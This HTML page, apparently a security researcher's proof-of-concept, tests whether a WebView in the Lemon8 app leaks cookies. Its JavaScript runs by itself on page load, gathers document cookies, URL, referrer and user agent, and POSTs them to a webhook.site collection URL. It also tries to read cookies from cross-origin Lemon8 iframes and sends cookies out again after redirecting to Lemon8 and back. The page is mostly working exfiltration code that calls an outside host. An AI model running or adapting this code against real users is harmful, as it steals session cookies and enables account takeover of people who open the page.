<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Domain Navigation & Cookie Test</title>
    <style>
        body {
            font-family: -apple-system, sans-serif;
            padding: 20px;
            background: #1a1a1a;
            color: white;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #2d2d2d;
            border-radius: 15px;
            padding: 30px;
        }
        h1 { color: #e74c3c; }
        .log {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 8px;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            max-height: 400px;
            overflow-y: auto;
        }
        .log-entry {
            margin: 5px 0;
            padding: 5px;
            border-left: 3px solid #3498db;
            padding-left: 10px;
        }
        .success { border-left-color: #27ae60; color: #27ae60; }
        .error { border-left-color: #e74c3c; color: #e74c3c; }
        .info { border-left-color: #3498db; color: #3498db; }
        .data { border-left-color: #f39c12; color: #f39c12; }
        button {
            background: #e74c3c;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            margin: 5px;
            font-weight: 600;
        }
        button:hover { background: #c0392b; }
        #iframe-container {
            margin-top: 20px;
            border: 2px solid #3498db;
            border-radius: 8px;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 Domain Navigation & Cookie Test</h1>
        <p>Testing if we can navigate to Lemon8 domains to access real cookies...</p>
        
        <div style="margin: 20px 0;">
            <button onclick="testCurrentDomain()">📍 Test Current Domain</button>
            <button onclick="testIframeInjection()">🖼️ Test Iframe Injection</button>
            <button onclick="navigateToLemon8()">🚀 Navigate to Lemon8</button>
        </div>
        
        <div id="logContainer" class="log"></div>
        
        <div id="iframe-container"></div>
    </div>
    
    <script>
        // REPLACE WITH YOUR WEBHOOK
        const WEBHOOK_URL = 'https://webhook.site/YOUR-UNIQUE-ID';
        
        function log(message, type = 'info') {
            const logContainer = document.getElementById('logContainer');
            const entry = document.createElement('div');
            entry.className = `log-entry ${type}`;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logContainer.appendChild(entry);
            logContainer.scrollTop = logContainer.scrollHeight;
            console.log(`[${type.toUpperCase()}]`, message);
        }
        
        function sendToWebhook(data) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    ...data
                })
            }).then(() => {
                log('Data sent to webhook', 'success');
            }).catch(e => {
                log('Webhook failed: ' + e.message, 'error');
            });
        }
        
        // ==============================================
        // TEST 1: CURRENT DOMAIN
        // ==============================================
        function testCurrentDomain() {
            log('========================================', 'info');
            log('TEST 1: Current Domain Analysis', 'info');
            log('========================================', 'info');
            
            const data = {
                test: 'current_domain',
                results: {
                    hostname: window.location.hostname,
                    href: window.location.href,
                    protocol: window.location.protocol,
                    origin: window.location.origin,
                    pathname: window.location.pathname,
                    cookies: document.cookie || '(none)',
                    referrer: document.referrer || '(none)',
                    userAgent: navigator.userAgent
                }
            };
            
            log('Hostname: ' + data.results.hostname, 'data');
            log('Full URL: ' + data.results.href, 'data');
            log('Cookies: ' + data.results.cookies, data.results.cookies ? 'success' : 'error');
            
            sendToWebhook(data);
        }
        
        // ==============================================
        // TEST 2: IFRAME INJECTION
        // ==============================================
        function testIframeInjection() {
            log('========================================', 'info');
            log('TEST 2: Iframe Injection to Lemon8 Domain', 'info');
            log('========================================', 'info');
            
            const lemon8URLs = [
                'https://www.lemon8-app.com',
                'https://www.lemon8-app.com/explore',
                'https://api.lemon8-app.com',
                'https://m.lemon8-app.com'
            ];
            
            const container = document.getElementById('iframe-container');
            container.innerHTML = '<h3 style="color: #3498db; padding: 15px;">Iframe Tests:</h3>';
            
            lemon8URLs.forEach((url, index) => {
                log(`Creating iframe ${index + 1}: ${url}`, 'info');
                
                const iframeWrapper = document.createElement('div');
                iframeWrapper.style.cssText = 'margin: 10px; padding: 10px; background: #1a1a1a; border-radius: 5px;';
                
                const iframe = document.createElement('iframe');
                iframe.src = url;
                iframe.style.cssText = 'width: 100%; height: 300px; border: 1px solid #3498db; border-radius: 5px;';
                iframe.id = 'iframe_' + index;
                
                const status = document.createElement('div');
                status.id = 'status_' + index;
                status.style.cssText = 'margin-top: 5px; font-size: 12px; color: #95a5a6;';
                status.textContent = 'Loading: ' + url;
                
                iframe.onload = function() {
                    log(`Iframe ${index + 1} loaded`, 'success');
                    status.textContent = '✓ Loaded: ' + url;
                    status.style.color = '#27ae60';
                    
                    // Try to access iframe content
                    try {
                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                        const iframeCookies = iframeDoc.cookie;
                        
                        log(`SUCCESS: Accessed iframe ${index + 1} document!`, 'success');
                        log(`Iframe cookies: ${iframeCookies || '(none)'}`, 'data');
                        
                        sendToWebhook({
                            test: 'iframe_access_success',
                            url: url,
                            cookies: iframeCookies,
                            documentTitle: iframeDoc.title,
                            domain: iframeDoc.domain
                        });
                        
                        status.textContent = '✓✓ ACCESSED! Cookies: ' + (iframeCookies || 'none');
                        status.style.color = '#f39c12';
                        
                    } catch (e) {
                        log(`BLOCKED: Cannot access iframe ${index + 1} - ${e.message}`, 'error');
                        
                        sendToWebhook({
                            test: 'iframe_access_blocked',
                            url: url,
                            error: e.message
                        });
                        
                        status.textContent = '✗ Blocked: ' + e.message;
                        status.style.color = '#e74c3c';
                    }
                };
                
                iframe.onerror = function() {
                    log(`Iframe ${index + 1} failed to load`, 'error');
                    status.textContent = '✗ Failed to load';
                    status.style.color = '#e74c3c';
                };
                
                iframeWrapper.appendChild(status);
                iframeWrapper.appendChild(iframe);
                container.appendChild(iframeWrapper);
            });
        }
        
        // ==============================================
        // TEST 3: DIRECT NAVIGATION
        // ==============================================
        function navigateToLemon8() {
            log('========================================', 'info');
            log('TEST 3: Direct Navigation to Lemon8', 'info');
            log('========================================', 'info');
            
            log('WARNING: This will navigate away from this page!', 'error');
            log('Current cookies before navigation: ' + document.cookie, 'data');
            
            sendToWebhook({
                test: 'pre_navigation',
                currentDomain: window.location.hostname,
                currentCookies: document.cookie
            });
            
            // Try multiple navigation methods
            const targetURL = 'https://www.lemon8-app.com/explore';
            
            log('Attempting navigation to: ' + targetURL, 'info');
            log('Method 1: window.location.href (in 3 seconds...)', 'info');
            
            let countdown = 3;
            const countdownInterval = setInterval(() => {
                log(`Navigating in ${countdown}...`, 'info');
                countdown--;
                if (countdown === 0) {
                    clearInterval(countdownInterval);
                    
                    log('Navigating NOW!', 'success');
                    
                    // Try navigation
                    try {
                        window.location.href = targetURL;
                    } catch (e) {
                        log('Navigation blocked: ' + e.message, 'error');
                        
                        // Try alternative method
                        log('Trying window.location.replace...', 'info');
                        try {
                            window.location.replace(targetURL);
                        } catch (e2) {
                            log('Replace also blocked: ' + e2.message, 'error');
                            
                            // Try meta refresh
                            log('Trying meta refresh...', 'info');
                            const meta = document.createElement('meta');
                            meta.httpEquiv = 'refresh';
                            meta.content = '0; url=' + targetURL;
                            document.head.appendChild(meta);
                        }
                    }
                }
            }, 1000);
        }
        
        // ==============================================
        // AUTO-RUN ON LOAD
        // ==============================================
        window.addEventListener('load', function() {
            log('Page loaded in WebView', 'success');
            log('User Agent: ' + navigator.userAgent, 'info');
            
            // Auto-run Test 1
            setTimeout(() => {
                testCurrentDomain();
            }, 1000);
            
            // Check if we were redirected back from Lemon8
            if (document.referrer.includes('lemon8')) {
                log('========================================', 'success');
                log('REDIRECTED BACK FROM LEMON8!', 'success');
                log('========================================', 'success');
                log('Checking for Lemon8 cookies...', 'info');
                
                const cookies = document.cookie;
                log('Cookies after navigation: ' + cookies, cookies ? 'success' : 'error');
                
                sendToWebhook({
                    test: 'post_navigation',
                    referrer: document.referrer,
                    currentDomain: window.location.hostname,
                    cookies: cookies,
                    success: !!cookies
                });
            }
        });
    </script>
</body>
</html>
